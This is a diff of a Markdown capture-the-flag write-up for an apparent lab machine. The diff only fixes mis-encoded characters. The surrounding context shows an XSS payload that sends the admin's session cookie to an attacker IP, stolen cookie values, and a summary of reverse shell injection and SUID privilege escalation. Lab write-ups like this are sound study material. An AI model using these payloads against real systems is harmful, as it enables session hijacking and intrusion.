@@ -146,7 +146,7 @@ Intercepting the support form request with BurpSuite:
 
 ![bs_dashboard](screenshots/bs_dashboard.png)
 
-Nothing interesting. LetÂ´s see if there are XSS vulnerabilities filling the form like:
+Nothing interesting. Let's see if there are XSS vulnerabilities filling the form like:
 
 ![support_xss](screenshots/support_xss.png)
 
@@ -154,7 +154,7 @@ After tap on **submit**:
 
 ![support_hacking_attempt](screenshots/support_hacking_attempt.png)
 
-Seems that our info has been sent to support team to analyze the hacking attempt detected. Probably, if we intercept this request, we can see where this info is going and steal the receiverâ€™s session cookie.
+Seems that our info has been sent to support team to analyze the hacking attempt detected. Probably, if we intercept this request, we can see where this info is going and steal the receiver’s session cookie.
 
 Intercepting the request:
 
@@ -177,7 +177,7 @@ Thus, the application is vulnerable to **XSS**.
 ---
 ### 3.2 Cookie Stealing via XSS
 
-We can steal the adminâ€™s session cookie with the following payload:
+We can steal the admin’s session cookie with the following payload:
 
 ```html
 <script>var i=new Image(); i.src="http://10.10.14.7/?cookie=" + document.cookie</script>
@@ -198,7 +198,7 @@ InVzZXIi.uAlmXlTvm8vyihjNaPDWnvB_Zfs
 ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0
 ```
 
-We replace our cookie in the browser with the adminâ€™s:
+We replace our cookie in the browser with the admin’s:
 
 ![admin_dashboard](screenshots/admin_dashboard.png)
 
@@ -234,7 +234,7 @@ This time, the reverse shell connects:
 
 ![user_flag](screenshots/user_flag.png)
 
-âœ… **User flag obtained**
+✅ **User flag obtained**
 
 ---
 ## 4. Privilege Escalation
@@ -304,19 +304,19 @@ Now `/bin/bash` has the SUID bit set, allowing us to spawn a root shell:
 
 ![root_flag](screenshots/root_flag.png)
 
-âœ… **Root flag obtained**
+✅ **Root flag obtained**
 
 ---
-# âœ… MACHINE COMPLETE
+# ✅ MACHINE COMPLETE
 
 ---
 ## Summary of Exploitation Path
 
-1. **Web Enumeration** â†’ Identified `/support` and `/dashboard`.  
-2. **XSS** â†’ Injected script to steal the admin cookie.  
-3. **Session Hijacking** â†’ Used stolen cookie to access `/dashboard`.  
-4. **Reverse Shell Injection** â†’ Exploited the `date` parameter to gain user access.  
-5. **Privilege Escalation** â†’ Abused `syscheck` script and replaced `initdb.sh` to escalate to root.
+1. **Web Enumeration** → Identified `/support` and `/dashboard`.  
+2. **XSS** → Injected script to steal the admin cookie.  
+3. **Session Hijacking** → Used stolen cookie to access `/dashboard`.  
+4. **Reverse Shell Injection** → Exploited the `date` parameter to gain user access.  
+5. **Privilege Escalation** → Abused `syscheck` script and replaced `initdb.sh` to escalate to root.
 
 ---
 ## Defensive Recommendations
